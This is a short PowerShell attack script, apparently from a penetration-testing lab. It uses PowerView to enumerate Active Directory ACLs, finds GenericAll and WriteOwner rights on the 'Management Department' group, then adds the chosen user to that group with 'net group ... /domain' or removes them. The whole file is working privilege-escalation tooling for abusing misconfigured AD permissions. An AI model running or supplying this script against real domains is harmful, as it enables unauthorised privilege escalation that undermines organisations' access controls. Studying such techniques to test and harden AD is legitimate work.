######################################################################################
#
# Intent: Enumerate user/group permissions (ACE/ACL)
# Todo: Enumerate a user and their groups recursively
# Date: Sep23
# Author: DeMzDaRulez
#
######################################################################################


# Prompt for username or default to current user
$username = Read-Host "Enter the username or group name (leave empty to use current user)"
if ([string]::IsNullOrEmpty($username)) {
    $username = $(whoami).Split('\')[-1]
}

# Prompt for action (add/del/none) or default to none
$action = Read-Host "Enter the action (add/del/none, leave empty for none)"
if ([string]::IsNullOrEmpty($action)) {
    $action = 'none'
}

# Import PowerView
Import-Module PowerView.ps1

# Enumerate ACL for the specified or current user
Write-Host "Enumerating ACL for user: $username"
$acl_user = Get-ObjectAcl -Identity $username
$acl_user | ForEach-Object { Convert-SidToName $_.SecurityIdentifier }
Write-Host "`n`n`n"

# Enumerate ACL for a target group, focusing on GenericAll and WriteOwner permissions
Write-Host "Enumerating ACL for 'Management Department' with focus on GenericAll and WriteOwner permissions"
$acl_genericAll = Get-ObjectAcl -Identity 'Management Department' | Where-Object { $_.ActiveDirectoryRights -eq 'GenericAll' -or $_.ActiveDirectoryRights -eq 'WriteOwner' }
$acl_genericAll | ForEach-Object { Convert-SidToName $_.SecurityIdentifier }
Write-Host "`n`n`n"

# Perform the specified action (add/del) to target group only if action is not 'none'
if ($action -ne 'none') {
    Write-Host "Performing $action action for user $username on 'Management Department'"
    net group "Management Department" $username /$action /domain
}
Write-Host "`n`n`n"

# Verify user state in target group
Write-Host "Verifying user state in 'Management Department'"
Get-NetGroup "Management Department" | select -ExpandProperty member
Write-Host "`n`n`n"
